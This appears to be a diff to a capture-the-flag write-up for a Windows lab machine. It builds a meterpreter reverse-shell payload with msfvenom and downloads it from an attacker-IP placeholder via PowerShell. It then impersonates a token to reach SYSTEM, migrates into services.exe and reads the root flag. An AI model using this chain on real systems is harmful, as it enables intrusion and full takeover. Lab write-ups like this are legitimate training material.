@@ -154,7 +154,7 @@ Get the flag:
 
 Generate payload:
 
-	# msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<IP address attack machine> LPORT=<Listen port on attack machine> -f exe -o shell.exe
+	# msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<IP address attack machine> LPORT=8080 -f exe -o shell.exe
 
 Set up a Python web server to host the reverse shell:
 
@@ -162,7 +162,7 @@ Set up a Python web server to host the reverse shell:
 
 Download the `shell.exe` to the target machine:
 
-	PS  C:\Users\bruce\Desktop> powershell "(New-Object System.Net.WebClient).Downloadfile('http://[ATTACKER IP]:8888/shell.exe','shell.exe')"
+	PS  C:\Users\bruce\Desktop> powershell "(New-Object System.Net.WebClient).Downloadfile('http://[ATTACKER IP]:8080/shell.exe','shell.exe')"
 
 In a new terminal, start Metasploit, select the multi handler module, set the payload type, LHOST and LPORT options to match the payload shell, and run the listener:
 
@@ -177,4 +177,93 @@ In the powershell terminal, execute the reverse shell using the Powershell `Star
 
 	PS C:\Users\bruce\Desktop> Start-Process "shell.exe"
 
+Back in the metasploit terminal:
+
+    [*] Started reverse TCP handler on 10.9.1.53:4443 
+    [*] Sending stage (175686 bytes) to 10.10.184.145
+    [*] Meterpreter session 1 opened (10.9.1.53:4443 -> 10.10.184.145:49352) at 2022-09-29 20:13:30 +0100
+    
+    meterpreter > 
+
 ## Privilege escalation
+
+Check privileges. Left out all disabled services for readability:
+
+```text
+PS C:\Users\bruce\Desktop> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State   
+=============================== ========================================= ========
+...
+SeDebugPrivilege                Debug programs                            Enabled 
+...
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
+...
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege         Create global objects                     Enabled 
+...
+```
+
+It appears the current user has the SeImpersonate privilege.
+
+### Impersonation
+
+Load [incognito](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/), which allows for impersonating tokens:
+
+    meterpreter > load incognito
+    Loading extension incognito...Success.
+
+List tokens:
+
+    meterpreter > list_tokens -g
+    [-] Warning: Not currently running as SYSTEM, not all tokens will be available
+                 Call rev2self if primary process token is SYSTEM
+    
+    Delegation Tokens Available
+    ========================================
+    \
+    BUILTIN\Administrators
+    ...
+
+Impersonate:
+
+    meterpreter > impersonate_token "BUILTIN\Administrators"
+    [-] Warning: Not currently running as SYSTEM, not all tokens will be available
+                 Call rev2self if primary process token is SYSTEM
+    [+] Delegation token available
+    [+] Successfully impersonated user NT AUTHORITY\SYSTEM
+    meterpreter > getuid
+    Server username: NT AUTHORITY\SYSTEM
+
+### Migration
+
+```text
+meterpreter > ps
+Process List
+============
+
+ PID   PPID  Name               Arch  Session  User                     Path
+ ---   ----  ----               ----  -------  ----                     ----
+ 0     0     [System Process]
+ ...
+ 668   580   services.exe       x64   0        NT AUTHORITY\SYSTEM      C:\Windows\System32\services.exe
+ ...
+```
+
+Migrate:
+
+    meterpreter > migrate 668
+    [*] Migrating from 2960 to 668...
+    [*] Migration completed successfully.
+
+### Flag
+
+Get the flag:
+
+    meterpreter > shell
+    C:\Windows\system32>cd config
+    C:\Windows\System32\config>type root.txt
+    type root.txt
